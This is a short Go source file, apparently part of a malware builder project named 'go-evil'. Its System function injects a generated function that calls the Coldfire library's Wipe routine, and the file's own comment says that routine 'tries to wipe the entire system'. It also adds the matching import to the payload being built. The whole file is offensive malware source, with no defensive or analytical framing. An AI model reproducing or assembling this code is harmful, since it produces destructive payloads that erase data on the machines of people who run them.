package wipe

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
)

// Tries to wipe the entire system
func System(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "wipe_system"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", function_call),
		"err := coldfire.Wipe()",
		"if err != nil{",
		"spine.log(err.Error())",
		"}",
		"}"})

	data_object.Add_go_import("github.com/redcode-labs/Coldfire")

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
}
